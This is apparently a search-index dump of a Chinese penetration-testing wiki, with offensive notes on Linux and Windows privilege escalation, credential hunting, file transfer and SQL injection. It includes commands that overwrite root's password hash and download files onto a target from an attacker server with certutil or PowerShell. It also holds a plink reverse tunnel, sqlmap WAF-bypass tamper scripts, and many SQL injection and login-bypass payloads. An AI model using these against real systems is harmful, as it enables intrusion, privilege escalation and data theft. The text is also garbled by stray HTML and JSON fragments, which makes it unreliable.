mkpasswd -m sha-512 123456# 生成hash，hash算法为sha-512 替换etcshadow中root的密码 三、可写passwd文件利用提权提权肯定最先关注root用户，现代的linux发行版中，密码hash都是存储在etcshadow中，etcpasswd中并不直接存储密码hash，通常用X来占位，但是还是可以直接将密码写入etcpasswd中，尝试提权。也就是一个优先级的问题，先读取passwd，再读取shadow文件。 cp etcpasswd tmppasswd.bak # 备份文件 openssl passwd明文# openssl passwd生成密码的hash值 # 替换etcpasswd中的X 生成hash时，也可以用font style=color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);mkpasswd/font，但是passwd文件中生成hash时最好用font style=color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);openssl passwd/font，再shadow文件中生成hash用font style=color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);mkpasswd/font。 https://forum.butian.net/share/317 第三方服务NFS共享https://www.cnblogs.com/kqdssheng/p/18310245#id1 NFS（网络文件系统）是一种在端口TCPUDP2049上运行的网络文件共享协议，由服务器和客户端两个组件组成。NFS服务器上创建共享目录，可以通过网络与其他Linux客户端共享文件。获得权限的用户可以将文件添加到共享中，并与有权访问该目录的其他用户共享。 默认情况下，每个NFS共享都会启用root_squash功能，以防止共享文件拥有root:root身份或特殊权限（即启用root_squash后，所有共享文件都会变成nobody:nogroup身份）。但是，如果启用了no_root_squash功能，文件可以以root身份存在，这就容易导致权限升级。 MYSQLhttps://www.geekby.site/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/ docker内核漏洞提权非必要情况，不建议使用，容易搞宕机","tags":[null]},{"title":"提权","path":"/wiki/内网/提权/index.html","content":"Linux提权 点击阅读详细内容... 📝 文档 Lin_信息收集 点击阅读详细内容... 📝 文档 Mimikatz教程 点击阅读详细内容... 📝 文档 windows 提权 点击阅读详细内容... 📝 文档 Win_信息收集 点击阅读详细内容... 📝 文档"},{"title":"Win_信息收集","path":"/wiki/内网/提权/Win_信息收集.html","content":"指南概述在每个部分中，我首先提供老的可靠的CMD命令，然后是一个Powershell实现的的等价命令。同时拥有这两种工具是非常好的，Powershell比传统的CMD更加灵活。然而，没有一个Powershell命令能等价于所有东西（或者CMD在某些事情上仍然更简单更好），所以一些部分将只包含常规的CMD命令。 操作系统操作系统类型和架构？它是否缺少任何补丁？ systeminfowmic qfe 环境变量有什么有趣的地方吗？域控制器在LOGONSERVER？ setGet-ChildItem Env: | ft Key,Value 有没有其他连接的驱动器？ net usewmic logicaldisk get caption,description,providernameGet-PSDrive | where $_.Provider -like Microsoft.PowerShell.Core\\FileSystem| ft Name,Root 用户 你是谁？ whoamiecho %USERNAME%$env:UserName 系统上有哪些用户？任何旧的用户配置文件没有被清理掉？ net usersdir /b /ad C:\\Users\\dir /b /ad C:\\Documents and Settings\\ # Windows XP and belowGet-LocalUser | ft Name,Enabled,LastLogonGet-ChildItem C:\\Users -Force | select Name 是否有其他人登录？ qwinsta 系统上有哪些用户组？ net localgroupGet-LocalGroup | ft Name 在管理员组中有哪些用户？ net localgroup AdministratorsGet-LocalGroupMember Administrators | ft Name, PrincipalSource 用户自动登录对应的注册表中有些什么内容？ reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon 2nul | findstr DefaultUserName DefaultDomainName DefaultPasswordGet-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon | select Default* Credential Manager中有什么有趣的东西？ cmdkey /list 我们可以访问SAM和SYSTEM文件吗？ %SYSTEMROOT%\\repair\\SAM%SYSTEMROOT%\\System32\\config\\RegBack\\SAM%SYSTEMROOT%\\System32\\config\\SAM%SYSTEMROOT%\\repair\\system%SYSTEMROOT%\\System32\\config\\SYSTEM%SYSTEMROOT%\\System32\\config\\RegBack\\system 程序，进程和服务 系统都安装了些什么软件？ dir /a C:\\Program Filesdir /a C:\\Program Files (x86)reg query HKEY_LOCAL_MACHINE\\SOFTWAREGet-ChildItem C:\\Program Files, C:\\Program Files (x86) | ft Parent,Name,LastWriteTimeGet-ChildItem -path Registry::HKEY_LOCAL_MACHINE\\SOFTWARE | ft Name 有没有权限设置的比较脆弱的文件夹或文件的权限？ 在程序文件夹中（Program Folders）有哪些文件或文件夹赋予了所有人（Everyone）或用户（User）的完全权限？ icacls C:\\Program Files\\* 2nul | findstr (F) | findstr Everyoneicacls C:\\Program Files (x86)\\* 2nul | findstr (F) | findstr Everyone icacls C:\\Program Files\\* 2nul | findstr (F) | findstr BUILTIN\\Usersicacls C:\\Program Files (x86)\\* 2nul | findstr (F) | findstr BUILTIN\\Users 修改程序文件夹（Program Folders）中的所有人（Everyone）或用户（User）的权限？ icacls C:\\Program Files\\* 2nul | findstr (M) | findstr Everyoneicacls C:\\Program Files (x86)\\* 2nul | findstr (M) | findstr Everyone icacls C:\\Program Files\\* 2nul | findstr (M) | findstr BUILTIN\\Usersicacls C:\\Program Files (x86)\\* 2nul | findstr (M) | findstr BUILTIN\\UsersGet-ChildItem C:\\Program Files\\*,C:\\Program Files (x86)\\* | % try Get-Acl $_ -EA SilentlyContinue | Where ($_.Access|select -ExpandProperty IdentityReference) -match Everyone catch Get-ChildItem C:\\Program Files\\*,C:\\Program Files (x86)\\* | % try Get-Acl $_ -EA SilentlyContinue | Where ($_.Access|select -ExpandProperty IdentityReference) -match BUILTIN\\Users catch 你也可以上传Sysinternals中的accesschk来检查可写文件夹和文件。 accesschk.exe -qwsu Everyone *accesschk.exe -qwsu Authenticated Users *accesschk.exe -qwsu Users * 系统上正在运行的进程服务有哪些？有没有暴露的内部服务？如果是这样，我们可以打开它吗？请参阅附录中的端口转发。 tasklist /svctasklist /vnet startsc queryGet-Process | ft ProcessName,IdGet-Service 是否存在任何脆弱的服务权限？我们可以重新配置什么吗？你可以再次上传accesschk来检查权限。 accesschk.exe -uwcqv Everyone *accesschk.exe -uwcqv Authenticated Users *accesschk.exe -uwcqv Users * 有没有引用的服务路径？ wmic service get name,displayname,pathname,startmode 2nul |findstr /i Auto 2nul |findstr /i /v C:\\Windows\\\\ 2nul |findstr /i /v 是否设置了计划任务？任何自定义实现的计划任务？ schtasks /query /fo LIST 2nul | findstr TaskNamedir C:\\windows\\tasksGet-ScheduledTask | ft TaskName, State 系统启动时都运行了些什么？ wmic startup get caption,commandreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Runreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOncereg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Runreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOncedir C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startupdir C:\\Documents and Settings\\%username%\\Start Menu\\Programs\\StartupGet-CimInstance Win32_StartupCommand | select Name, command, Location, User | flGet-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunGet-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceGet-ItemProperty -Path Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunGet-ItemProperty -Path Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceGet-ChildItem C:\\Users\\All Users\\Start Menu\\Programs\\StartupGet-ChildItem C:\\Users\\$env:USERNAME\\Start Menu\\Programs\\Startup AlwaysInstallElevated是否启用？我没有跑过这个，但没有伤害检查。 reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 网络 连接到了哪一块网卡？是否有多个网络？ ipconfig /allGet-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address 我们有哪些网络路线？ route printGet-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex ARP缓存中有什么？ arp -aGet-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State 是否有连接到其他主机的网络连接？ netstat -ano hosts文件中的任何东西？ C:\\WINDOWS\\System32\\drivers\\etc\\hosts 防火墙是否打开？如果是又是怎样配置的？ netsh firewall show statenetsh firewall show confignetsh advfirewall firewall show rule name=allnetsh advfirewall export firewall.txt 任何其他有趣的接口配置？ netsh dump 有没有SNMP配置？ reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /sGet-ChildItem -path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SNMP -Recurse 有趣的文件和敏感信息 这部分内容的命令输出可能有点杂乱，所以你可能想把命令的输出重定向到txt文件中进行审查和解析。 在注册表中是否有任何密码？ reg query HKCU /f password /t REG_SZ /sreg query HKLM /f password /t REG_SZ /s 查看是否存在没有清理掉的sysprep或unattended文件？ dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2nulGet-Childitem –Path C:\\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where ($_.Name -like *.xml -or $_.Name -like *.txt -or $_.Name -like *.ini) 如果服务器是IIS网络服务器，那么inetpub中有什么？以及任何隐藏的目录？web.config文件？ dir /a C:\\inetpub\\dir /s web.configC:\\Windows\\System32\\inetsrv\\config\\applicationHost.configGet-Childitem –Path C:\\inetpub\\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue 在IIS日志目录中有些什么文件？ C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex[YYMMDD].logC:\\inetpub\\logs\\LogFiles\\W3SVC2\\u_ex[YYMMDD].logC:\\inetpub\\logs\\LogFiles\\FTPSVC1\\u_ex[YYMMDD].logC:\\inetpub\\logs\\LogFiles\\FTPSVC2\\u_ex[YYMMDD].log 是否安装了XAMPP，Apache或PHP？任何有XAMPP，Apache或PHP配置文件？ dir /s php.ini httpd.conf httpd-xampp.conf my.ini my.cnfGet-Childitem –Path C:\\ -Include php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -ErrorAction SilentlyContinue 系统中是否存在任何Apache网络日志？ dir /s access.log error.logGet-Childitem –Path C:\\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue 系统中是否任何有趣的文件？可能在用户目录（桌面，文档等）？ dir /s *pass* == *vnc* == *.config* 2nulGet-Childitem –Path C:\\Users\\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue 系统中是否有包含密码的文件？ findstr /si password *.xml *.ini *.txt *.config 2nulGet-ChildItem C:\\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern password 附录传输文件 在特权升级过程中的某个时候，你需要将文件放到你的目标上。下面是一些简单的方法来做到这一点。 Powershell Cmdlet（Powershell 3.0及更高版本） Invoke-WebRequest https://myserver/filename -OutFile C:\\Windows\\Temp\\filename Powershell一行代码实现方法： (New-Object System.Net.WebClient).DownloadFile(https://myserver/filename, C:\\Windows\\Temp\\filename) Powershell脚本 echo $webclient = New-Object System.Net.WebClient wget.ps1echo $url = http://IPADDRESS/file.exe wget.ps1echo $file = output-file.exe wget.ps1echo $webclient.DownloadFile($url,$file) wget.ps1 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 通过文本文件的非交互式FTP。当你只有有限的命令执行时这很有用。 echo open 10.10.10.11 21 ftp.txtecho USER username ftp.txtecho mypassword ftp.txtecho bin ftp.txtecho GET filename ftp.txtecho bye ftp.txt ftp -v -n -s:ftp.txtCERTUTIL certutil.exe -urlcache -split -f https://myserver/filename outputfilename 转发端口 这对于暴露机器外部不可用的内部服务非常有用，通常是由于防火墙设置。 上传plink.exe到目标。 在攻击机器上启动SSH。 例如要公开SMB，在目标上运行： plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS 注意：从Windows 10的秋季创作者更新版本开始，OpenSSH已经在Windows的beta版本中推出，所以我预计有一天我们可能只能使用普通的旧的SSH命令进行端口转发，具体取决于是否启用。 本地文件包含列表 这不是一个详尽的列表，安装目录会有所不同，我只列出了一些常见的文件路径。 C:\\Apache\\conf\\httpd.confC:\\Apache\\logs\\access.logC:\\Apache\\logs\\error.logC:\\Apache2\\conf\\httpd.confC:\\Apache2\\logs\\access.logC:\\Apache2\\logs\\error.logC:\\Apache22\\conf\\httpd.confC:\\Apache22\\logs\\access.logC:\\Apache22\\logs\\error.logC:\\Apache24\\conf\\httpd.confC:\\Apache24\\logs\\access.logC:\\Apache24\\logs\\error.logC:\\Documents and Settings\\Administrator\\NTUser.datC:\\php\\php.iniC:\\php4\\php.iniC:\\php5\\php.iniC:\\php7\\php.iniC:\\Program Files (x86)\\Apache Group\\Apache\\conf\\httpd.confC:\\Program Files (x86)\\Apache Group\\Apache\\logs\\access.logC:\\Program Files (x86)\\Apache Group\\Apache\\logs\\error.logC:\\Program Files (x86)\\Apache Group\\Apache2\\conf\\httpd.confC:\\Program Files (x86)\\Apache Group\\Apache2\\logs\\access.logC:\\Program Files (x86)\\Apache Group\\Apache2\\logs\\error.logc:\\Program Files (x86)\\php\\php.iniC:\\Program Files\\Apache Group\\Apache\\conf\\httpd.confC:\\Program Files\\Apache Group\\Apache\\conf\\logs\\access.logC:\\Program Files\\Apache Group\\Apache\\conf\\logs\\error.logC:\\Program Files\\Apache Group\\Apache2\\conf\\httpd.confC:\\Program Files\\Apache Group\\Apache2\\conf\\logs\\access.logC:\\Program Files\\Apache Group\\Apache2\\conf\\logs\\error.logC:\\Program Files\\FileZilla Server\\FileZilla Server.xmlC:\\Program Files\\MySQL\\my.cnfC:\\Program Files\\MySQL\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.0\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.0\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.1\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.1\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.5\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.5\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.6\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.6\\my.iniC:\\Program Files\\MySQL\\MySQL Server 5.7\\my.cnfC:\\Program Files\\MySQL\\MySQL Server 5.7\\my.iniC:\\Program Files\\php\\php.iniC:\\Users\\Administrator\\NTUser.datC:\\Windows\\debug\\NetSetup.LOGC:\\Windows\\Panther\\Unattend\\Unattended.xmlC:\\Windows\\Panther\\Unattended.xmlC:\\Windows\\php.iniC:\\Windows\\repair\\SAMC:\\Windows\\repair\\systemC:\\Windows\\System32\\config\\AppEvent.evtC:\\Windows\\System32\\config\\RegBack\\SAMC:\\Windows\\System32\\config\\RegBack\\systemC:\\Windows\\System32\\config\\SAMC:\\Windows\\System32\\config\\SecEvent.evtC:\\Windows\\System32\\config\\SysEvent.evtC:\\Windows\\System32\\config\\SYSTEMC:\\Windows\\System32\\drivers\\etc\\hostsC:\\Windows\\System32\\winevt\\Logs\\Application.evtxC:\\Windows\\System32\\winevt\\Logs\\Security.evtxC:\\Windows\\System32\\winevt\\Logs\\System.evtxC:\\Windows\\win.iniC:\\xampp\\apache\\conf\\extra\\httpd-xampp.confC:\\xampp\\apache\\conf\\httpd.confC:\\xampp\\apache\\logs\\access.logC:\\xampp\\apache\\logs\\error.logC:\\xampp\\FileZillaFTP\\FileZilla Server.xmlC:\\xampp\\MercuryMail\\MERCURY.INIC:\\xampp\\mysql\\bin\\my.iniC:\\xampp\\php\\php.iniC:\\xampp\\security\\webdav.htpasswdC:\\xampp\\sendmail\\sendmail.iniC:\\xampp\\tomcat\\conf\\server.xml","tags":[null]},{"title":"SQLMAP","path":"/wiki/Web知识点/SQL注入/SQLMAP.html","content":"常用参数 font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);-u/font font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--url/font 指定目标url font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);-m/font 从文本中获取多个目标扫描 font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);-r/font 从文件中加载HTTP请求 font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--data/font 以POST方式提交数据 font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);-random-agent/font 随机ua font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--user-agent/font 指定ua font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--delay/font 设置请求间的延迟 font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--timeout/font 指定超时时间 font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--dbms/font 指定db，sqlmap支持的db有MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、SQLite等 font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--os/font 指定数据库服务器操作系统 font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--tamper/font 指定tamper font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--level/font 指定探测等级 font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--risk/font 指定风险等级 **font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--technique/font** ****注入技术 B: Boolean-based blind SQL injection E: Error-based SQL injection U: UNION query SQL injection S: Stacked queries SQL injection T: Time-based blind SQL injection 11.5.2. Tamper 速查 脚本名称 作用 apostrophemask.py 用utf8代替引号 equaltolike.py like 代替等号 space2dash.py 绕过过滤’’ 替换空格字符(“)，(‘’ - ‘)后跟一个破折号注释，一个随机字符串和一个新行(‘n’) greatest.py 绕过过滤’’ ,用GREATEST替换大于号。 space2hash.py 空格替换为#号 随机字符串 以及换行符 apostrophenullencode.py 绕过过滤双引号，替换字符和双引号。 halfversionedmorekeywords.py 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论 space2morehash.py 空格替换为 #号 以及更多随机字符串 换行符 appendnullbyte.py 在有效负荷结束位置加载零字节字符编码 ifnull2ifisnull.py 绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’ space2mssqlblank.py 空格替换为其它空符号 base64encode.py 用base64编码替换 space2mssqlhash.py 替换空格 modsecurityversioned.py 过滤空格，包含完整的查询版本注释 space2mysqlblank.py 空格替换其它空白符号(mysql) between.py 用between替换大于号() space2mysqldash.py 替换空格字符(“)(‘ - ‘)后跟一个破折号注释一个新行(‘ n’) multiplespaces.py 围绕SQL关键字添加多个空格 space2plus.py 用+替换空格 bluecoat.py 代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换为like nonrecursivereplacement.py 取代predefined SQL关键字with表示 suitable for替代(例如 .replace(“SELECT”、””)) filters space2randomblank.py 代替空格字符(“”)从一个随机的空白字符可选字符的有效集 sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾 chardoubleencode.py 双url编码(不处理以编码的) unionalltounion.py 替换UNION ALL SELECT UNION SELECT charencode.py url编码 randomcase.py 随机大小写 unmagicquotes.py 宽字符绕过 GPC addslashes randomcomments.py 用 font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);/**//font 分割sql关键字 charunicodeencode.py 字符串unicode编码 securesphere.py 追加特制的字符串 versionedmorekeywords.py 注释绕过 space2comment.py Replaces space character font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);/fontfont style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252); /fontfont style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);/font with comments font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);/**//font","tags":[null]},{"title":"SQLi流程","path":"/wiki/Web知识点/SQL注入/SQLi流程.html","content":"一、思路1、判断注入点在GET参数、POST参数、以及HTTP头部等，包括Cookie、Referer、XFF(X-Forwarded-for)、UA等地方尝试插入代码、符号或语句，尝试是否存在数据库参数读取行为，以及能否对其参数产生影响，如产生影响则说明存在注入点。 1）、GET 注入提交数据的方式是 GET，注入点的位置在 GET 参数部分。例如有这样的一个URL：http://xxx.com/news.php?id=1，id是注入点。 2）、POST 注入使用 POST 方式提交数据，注入点位置在 POST 数据部分，通常发生在表单中。 3）、HTTP 头部注入注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中，Cookie 字段中等。 2、判断数据库类型判断网站使用的是哪个数据库，常见数据库如：MySQL、MSSQL(SQLserver)、Oracle、Access、PostgreSQL、BD2等等。 nmap 端口扫描 数据库类型 默认端口号 Oracle 1521 SQL Server 1433 MySQL 3306 PostgreSql 5432 网站类型 数据库类型 asp SQL Server，Access .net SQL Server php Mysql，PostgreSql java Oracle，Mysql 数据库类型 特有的系统表 Oracle SYS.USER_TABLES SQL Server SYSOBJECTS MySQL(MySQL版本在5.0以上) INFORMATION_SCHEMA.TABLES Access MSYSOBJECTS 2、有回显 报错查询 exp: andor exp(~(select * from (select user () ) a) ); updatexml: andor(updatexml(1,concat(0x7e,(select database()),0x7e),1)) extractvalue: extractvalue(1,concat(0x7e,version(),0x7e)) 联合查询 确定列数：union select 1,2,3# 确定回显列：比如查出来 1，2 那就在1，2上进行查询 确定数据库：union select database() ,2,3# 确定表：union select (select group_concat(table_name)) ,2,3 from information_schema.tables where table_schemadatabase()# 确定列：union select (group_concat(column_name)),2,3 from information_schema.columns where table_name’ ‘# 确定用户：union select 1,group_concat(user),3 from ‘ ‘# information_schema.schemata #information_schema下面的所有数据库名 information_schema.tables #information_schema下面的所有表名 information_schema.columns #information_schema下面所有的列名 table_name #表名 column_name #列名 table_schema #数据库名 schema_name #数据库列表名 基于报错bool盲注and ascii(substr(database(),1,1))115 3、无回显 基于时间bool盲注 数据库：if(ascii(substr(database(),1,1))114,1,sleep(5))# 表if(ascii(substr(select group_concat(table_name) from information_schema.tables where table_schemadatabase() LIMIT 0,1),1,1))114,1,sleep(5))#LIMIT 0,1 → 获取第一张表（如 ‘users’） LIMIT 1,1 → 获取第二张表（如 ‘products’） 4、其他 宽字节：’被转义为 %df’ 堆叠：id1’; insert into users values(‘admin’,’password’)#","tags":[null]},{"title":"SQL注入","path":"/wiki/Web知识点/SQL注入/SQL注入.html","content":"SQL注入一、MySqL 一 、同站 判断是否有注入点 and 11 页面正常 and 12 页面异常 如果这两个都没有异常，那就试试字符集 ?id1’ 通过order by判断注入的字段数（猜一下） 页面错误与正常的临界点就是字段数 通过union 来测试 让id负数或者and12让网页报错，报错的那几个数字记住，那个数字报错就在哪里查 比如2，3报错，可以 ············union select 1，version(),database()，4 信息收集 数据库版本：version() 数据库名字：database() 数据库用户：user() 操作系统：@@version_compile_os 在mysql5.0以后的版本存在一个information_schema数据库、里面存储记录数据库名、表名、列名的数据库，相当于可以通过information_schema这个数据库获取到数据库下面的表名和列名 获取相关信息 ? id-1union select 1,group_concat(table_name),3 from information_schema.tables where table_schema’ ‘ ? id-1union select 1,group_concat(column_name),3 from information_schema.columns where table_name’ ‘ ? id-1union select 1,group_concat(user),group_concat(password) from ____ information_schema.schemata #information_schema下面的所有数据库名 information_schema.tables #information_schema下面的所有表名 information_schema.columns #information_schema下面所有的列名 table_name #表名 column_name #列名 table_schema #数据库名 schema_name #数据库列表ming名 二 、跨库查询 ? id-1union select 1,group_concat(schema_name),3 from information_schema.schemata 三、文件读写函数 load_file 文件读取 into outfile 或into dumpfile 文件写入 ！在注入点操作 四、int 函数判断是否为整数 $sql=SELECT * FROM users WHERE id=$id LIMIT 0,1; echo $sql; $result=mysql_query($sql);else echo ni shi ge jj?;``` 五、参数提交注入 #简要明确参数类型数字，字符，搜索，JsoN等#简要明确请求方法GET, POST,COOKIE，REQUEST，HTTP头等其中sql语句干扰符号: ,,s,),等，具体需看写法 二、其他数据库特点一、access注入 Access数据库 1表名 2列名 3数据 access 数据库都是存放在网站目录下，后缀格式为 mdb，asp，asa,可以通过一些暴库手段、目录猜解等直接下载数据库 access三大攻击手法 access注入攻击片段-联合查询法 access注入攻击片段-逐字猜解法 工具类的使用注入（推荐） Access注入攻击方式 union 注入、http header 注入、偏移注入等 二、msSQL注入https://www.cnblogs.com/xishaonian/p/6173644.html 三、postgresql注入https://www.cnblogs.com/KevinGeorge/p/8446874.html 四、Oracle注入https://www.cnblogs.com/peterpan0707007/p/8242119.html 五、mongoDB注入https://www.cnblogs.com/wefeng/p/11503102.html SQLmap不能识别MongoDB这里介绍nosqlattack:https://github.com/youngyangyang04/NoSQLAttack 三、 12种报错注入+万能语句1、通过floor报错,注入语句如下: and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a); 2、通过ExtractValue报错,注入语句如下: and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); 3、通过UpdateXml报错,注入语句如下: and 1(updatexml(1,concat(0x3a,(select user())),1)) 4、通过NAME_CONST报错,注入语句如下: and exists(select_from (select_from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c) 5、通过join报错,注入语句如下: select * from(select * from mysql.user ajoin mysql.user b)c; 6、通过exp报错,注入语句如下: and exp(~(select * from (select user () ) a) ); 7、通过GeometryCollection()报错,注入语句如下: and GeometryCollection(()select *from(select user () )a)b ); 8、通过polygon ()报错,注入语句如下: and polygon (()select * from(select user ())a)b ); 9、通过multipoint ()报错,注入语句如下: and multipoint (()select * from(select user() )a)b ); 10、通过multlinestring ()报错,注入语句如下: and multlinestring (()select * from(selectuser () )a)b ); 11、通过multpolygon ()报错,注入语句如下: and multpolygon (()select * from(selectuser () )a)b ); 12、通过linestring ()报错,注入语句如下: and linestring (()select * from(select user() )a)b ); 关于POST注入 常用的万能username语句： a ’ or 11 # a “) or 11 # a‘) or 11 # a” or “1””1 ‘ or ‘1’’1 ‘ or (length(database())) 8 (用于输入’ “都没有错误) ‘ or (ascii(substr((select database()) ,1,1))) 115 # (用于输入’ “都没有错误) “) or (“1”)(“1 “) or 11 or if(11, sleep(1), null) # “) or (length(database())) 8 # “) or (ascii(substr((select database()) ,1,1))) 115 or if(11, sleep(1), null) # post型盲注通杀payload： unameadmin%df’or()or%200%23passwdsubmitSubmit. 万能密码 �’or11# 关于UPDATEXML,REFERER,COOKIE的构造 User-Agent:……… or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) # Referer: ’ or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) # Cookie:username: admin ’ or updatexml(1,concat(0x7e,database(),0x7e),1) # updatexml报错注入 爆数据库版本信息：?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) 链接用户：?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) 链接数据库：?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) 爆库：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1) 爆表：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1) 爆字段：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1) 爆字段内容：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)","tags":[null]},{"title":"文件包含","path":"/wiki/WP/文件包含/index.html","content":"cat_flask+flask_session伪造 点击阅读详细内容... 📝 文档 include( .php) 点击阅读详细内容... 📝 文档 pear文件包含 点击阅读详细内容... 📝 文档 php_filter 点击阅读详细内容... 📝 文档 协议&&伪协议 点击阅读详细内容... 📝 文档 有意思的点 点击阅读详细内容... 📝 文档"},{"title":"cat_flask+flask_session伪造","path":"/wiki/WP/文件包含/cat_flask+flask_session伪造.html","content":"前置知识1. procselfcmdline/proc 是一种伪文件系统(虚拟文件系统)，存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件即当前正在运行进程的信息，甚至可以通过改变其中某些文件来改变内核的运行状态。/proc/self 表示当前进程目录，linux通过/proc/$pid/来获取指定进程的信息。如果某个进程想要获取当前进程的信息，可以通过进程$pid来访问，/proc/$pid/目录。是这个方法还需要获取进程pid.为了更方便的获取本进程的信息，linux提供了 /proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于 /proc/本进程pid/ 。进程可以通过访问/proc/self/目录来获取自己的系统信息，而不用每次都获取pid。/proc/self/cmdline 这个只读文件是包含了进程执行的完整命令．如果此进程是一个僵尸进程，那么次文件没有任何的内容．/proc/self/mem是当前进程的内存内容，通过修改该文件相当于直接修改当前进程的内存数据。但是注意该文件不能直接读取，因为文件中存在着一些无法读取的未被映射区域。所以要结合/proc/self/maps中的偏移地址进行读取。通过参数start和end及偏移地址值读取内容。/proc/self/maps包含的内容是当前进程的内存映射关系，可通过读取该文件来得到内存数据映射的地址。/proc/self/cwd：是一个符号链接，指向当前进程的当前工作目录。/proc/self/exe：是一个符号链接，指向当前进程的可执行文件。/proc/self/environ：包含当前进程的环境变量。/proc/self/fd/：是一个目录，包含当前进程打开的文件描述符的符号链接列表. 2. Flaskapp.pyflask_sessionFlask 是一个轻量级的 Python Web 框架，用于快速开发 Web 应用程序和 API。app.py 是 Flask 应用的入口文件，通常包含以下内容：初始化 Flask 应用：通过 Flask(__name__) 创建应用实例，__name__ 用于确定资源路径和调试信息 。路由定义：使用 @app.route 装饰器将 URL 映射到视图函数，支持动态参数（如 int:id）和请求方法（如 methods=[GET, POST]）。启动服务器：通过 app.run(debug=True, host=0.0.0.0, port=5000) 启动开发服务器，debug=True 启用调试模式 。 flask_session 是flask框架实现session功能的一个插件。其session结构分为三部分：序列化内容+时间+防篡改值，这三部分内容加密后以符号 